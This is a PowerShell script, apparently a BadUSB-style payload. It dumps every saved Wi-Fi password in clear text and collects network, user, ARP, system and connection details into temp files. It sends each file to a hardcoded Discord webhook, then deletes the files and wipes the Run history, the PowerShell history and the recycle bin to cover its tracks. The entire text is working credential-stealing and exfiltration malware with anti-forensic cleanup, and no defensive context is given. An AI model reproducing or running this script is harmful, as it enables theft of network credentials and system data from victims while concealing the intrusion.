Function Get-Networks {
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress
$WLANProfileNames =@()
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
Foreach($WLANProfileName in $Output){
  $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
Foreach($WLANProfileName in $WLANProfileNames){
try{
      $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
  }Catch{
    $WLANProfilePassword = "The password is not stored in this profile"
}
$WLANProfileObject = New-Object PSCustomobject
$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
$WLANProfileObjects += $WLANProfileObject
Remove-Variable WLANProfileObject
}
return $WLANProfileObjects
}
$Networks = Get-Networks

Get-Networks | Out-File -FilePath $env:TMP\WIFI-INFO.txt
ipconfig /all | Out-File -FilePath $env:TMP\ipconfig.txt
net user | Out-File -FilePath $env:TMP\users.txt
arp -a | Out-File -FilePath $env:TMP\arp.txt
systeminfo | Out-File -FilePath $env:TMP\systeminfo.txt
getmac /v | Out-File -FilePath $env:TMP\mac.txt
netstat -aon | Out-File -FilePath $env:TMP\netstat.txt



function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
Upload-Discord -file $env:TMP\WIFI-INFO.txt
Upload-Discord -file $env:TMP\ipconfig.txt
Upload-Discord -file $env:TMP\users.txt
Upload-Discord -file $env:TMP\arp.txt
Upload-Discord -file $env:TMP\systeminfo.txt
Upload-Discord -file $env:TMP\mac.txt
Upload-Discord -file $env:TMP\netstat.txt
rm "$env:TMP\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\users.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\arp.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\mac.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:TMP\netstat.txt" -r -Force -ErrorAction SilentlyContinue
function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit




